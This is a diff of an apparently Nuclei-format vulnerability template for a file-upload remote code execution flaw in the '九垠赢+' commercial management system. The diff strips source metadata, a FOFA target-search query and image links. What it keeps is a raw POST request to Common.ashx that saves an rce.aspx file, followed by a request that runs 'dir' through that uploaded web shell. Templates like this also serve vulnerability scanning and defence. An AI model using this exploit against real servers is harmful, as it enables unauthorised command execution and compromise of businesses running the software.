@@ -3,12 +3,8 @@ info:
   name: 九垠赢+商业管理系统 Common.ashx 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nfanl8nq8a3o2yoy'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nfanl8nq8a3o2yoy
-    fofa: body="九垠赢+"
 http:
 - raw:
   - 'POST /System/Common.ashx?type=savefile&path=rce.aspx HTTP/1.1
@@ -67,11 +63,8 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187899716-d79d36fe-23ab-4dfd-86f9-31f8e2858be2.png)
 
-    /System/rce.aspx?cmd=dir
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739187899979-6bc9c045-26b0-41c2-97aa-14cba90fddef.png)'
+    /System/rce.aspx?cmd=dir'
   redirects: false
   matchers:
   - status:
